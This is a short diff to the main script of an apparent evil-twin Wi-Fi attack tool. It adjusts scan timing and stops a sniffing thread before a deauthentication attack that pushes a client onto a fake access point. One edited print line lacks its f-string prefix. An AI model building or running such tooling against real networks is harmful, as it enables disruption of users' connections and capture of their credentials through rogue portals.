@@ -11,7 +11,7 @@ import evil_twin_framework.dauth as dauth
 import evil_twin_framework.fake_ap as fake_ap
 import evil_twin_framework.captive_portal as cp
 
-ONE_MINUTE_SCAN = 60
+ONE_MINUTE_SCAN = 10
 
 
 def cleanup_and_exit():
@@ -100,7 +100,7 @@ def main():
                             if wait == 'b':
                                 break
                             elif wait == 'w':
-                                print("[*] Waiting 60 seconds...")
+                                print("[*] Waiting {ONE_MINUTE_SCAN} seconds...")
                                 time.sleep(ONE_MINUTE_SCAN)
                                 continue
                             continue
@@ -180,6 +180,9 @@ def main():
                                         print(f"\n[*] Deauthing client {client_mac} for {ONE_MINUTE_SCAN} seconds...")
                                         print(f"[*] Using {deauth_interface} for deauth attacks")
                                         print("[*] Client should reconnect to our fake AP on wlan0")
+
+                                        network.stop_sniffing()
+                                        sniff_thread.join()
 
                                         dauth.start_attack(client_mac, target_bssid, deauth_interface, ONE_MINUTE_SCAN)
 
